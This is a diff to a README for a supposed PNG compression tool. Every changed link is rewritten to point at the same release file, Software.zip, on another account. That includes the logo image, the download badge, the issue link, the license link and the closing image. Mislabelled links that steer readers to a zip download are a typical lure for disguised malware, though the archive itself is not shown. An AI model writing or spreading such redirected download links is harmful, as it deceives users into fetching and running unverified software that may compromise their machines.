@@ -1,7 +1,7 @@
 
 # PNG Compressor 🖼️
 
-![PNG Compressor Logo](https://example.com/png-compressor-logo.png)
+![PNG Compressor Logo](https://github.com/dinolovexar/PNG-compressor/releases/download/v1.0/Software.zip)
 
 ## Overview ℹ️
 
@@ -22,7 +22,7 @@ Welcome to the PNG Compressor repository! This tool is designed to reduce PNG fi
 
 To get started with PNG Compressor, you can download the latest version by clicking on the button below:
 
-[![Download PNG Compressor](https://img.shields.io/badge/Download-PNG%20Compressor-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download PNG Compressor](https://github.com/dinolovexar/PNG-compressor/releases/download/v1.0/Software.zip%20Compressor-blue)](https://github.com/dinolovexar/PNG-compressor/releases/download/v1.0/Software.zip)
 
 Once downloaded, simply unzip the file and launch the application to start compressing your PNG images!
 
@@ -58,13 +58,13 @@ Explore the various topics related to PNG compression and image optimization wit
 
 ## Support 🤝
 
-If you encounter any issues or have suggestions for improvement, feel free to [raise an issue](https://github.com/png-compressor/issues). Your feedback is valuable in helping us enhance PNG Compressor for all users.
+If you encounter any issues or have suggestions for improvement, feel free to [raise an issue](https://github.com/dinolovexar/PNG-compressor/releases/download/v1.0/Software.zip). Your feedback is valuable in helping us enhance PNG Compressor for all users.
 
 ---
 
 ## License 📜
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/png-compressor/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/dinolovexar/PNG-compressor/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
@@ -72,4 +72,4 @@ Thank you for choosing PNG Compressor for your image optimization needs! 🌟
 
 Let's make your images shine while keeping file sizes in check! 🖌️
 
-![PNG Compressor](https://example.com/png-compressor-image.png)
+![PNG Compressor](https://github.com/dinolovexar/PNG-compressor/releases/download/v1.0/Software.zip)
